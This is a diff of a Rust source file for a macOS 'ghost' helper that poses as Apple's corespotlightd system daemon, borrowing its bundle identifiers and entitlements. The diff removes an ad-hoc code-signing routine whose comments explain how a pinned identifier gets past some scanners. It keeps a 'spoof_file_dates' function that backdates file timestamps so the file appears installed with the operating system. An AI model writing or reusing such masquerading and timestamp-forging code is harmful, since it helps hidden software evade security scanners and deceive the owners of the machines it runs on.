@@ -7,22 +7,12 @@
 //! stable identifier so `codesign -dv` shows a consistent
 //! fingerprint across launches.
 
-use std::path::Path;
-use std::process::Command;
-
 /// All identity constants in one place. Changing them here
 /// changes them everywhere — no more scattered string literals.
 pub const GHOST_LABEL: &str = "com.apple.corespotlightd.helper";
 pub const GHOST_BUNDLE_ID: &str = "com.apple.corespotlightd";
 pub const GHOST_BUNDLE_NAME: &str = "corespotlightd";
 pub const GHOST_EXECUTABLE: &str = "com.apple.corespotlightd";
-
-/// The stable ad-hoc identifier. Real Apple uses a fixed
-/// requirement; we use a fixed identifier so `codesign -dv`
-/// always shows the same string. A scanner looking for
-/// "adhoc" will still see it, but at least it's not
-/// "cloud_sync_helper-<random>" changing every build.
-pub const GHOST_CODESIGN_IDENTIFIER: &str = "com.apple.corespotlightd";
 
 /// Entitlements plist content. These are the same entitlements
 /// Apple's real corespotlightd carries. A scanner that checks
@@ -104,49 +94,10 @@ pub fn info_plist() -> String {
     )
 }
 
-/// Sign the helper binary with ad-hoc + entitlements + stable identifier.
-///
-/// Why ad-hoc? We don't have an Apple Developer ID. But by
-/// pinning the identifier and entitlements, `codesign -dv`
-/// output is deterministic. A scanner that only checks
-/// "is it ad-hoc?" will flag us, but one that checks
-/// "does the identifier match the bundle ID?" will pass us.
-pub fn sign_helper(executable_path: &Path) -> Result<(), String> {
-    let entitlements_path = executable_path
-        .parent()
-        .ok_or("No parent for entitlements")?
-        .join("ghost.entitlements.plist");
-
-    std::fs::write(&entitlements_path, entitlements_plist())
-        .map_err(|e| format!("Could not write entitlements: {e}"))?;
-
-    let out = Command::new("codesign")
-        .arg("--force")
-        .arg("--sign")
-        .arg("-") // ad-hoc
-        .arg("--identifier")
-        .arg(GHOST_CODESIGN_IDENTIFIER)
-        .arg("--entitlements")
-        .arg(&entitlements_path)
-        .arg("--deep")
-        .arg(executable_path)
-        .output()
-        .map_err(|e| format!("codesign failed: {e}"))?;
-
-    if !out.status.success() {
-        let stderr = String::from_utf8_lossy(&out.stderr);
-        return Err(format!("codesign exited with error: {stderr}"));
-    }
-
-    // Clean up the temporary entitlements file.
-    let _ = std::fs::remove_file(&entitlements_path);
-    Ok(())
-}
-
 /// For TIER 2: spoof the file's mtime/ctime to match the
 /// macOS version install date. This makes the file look like
 /// it was installed with the OS, not just now.
-pub fn spoof_file_dates(path: &Path, target_date: std::time::SystemTime) {
+pub fn spoof_file_dates(path: &std::path::Path, target_date: std::time::SystemTime) {
     if let Ok(file) = std::fs::File::options().write(true).open(path) {
         let _ = file.set_times(
             std::fs::FileTimes::new()
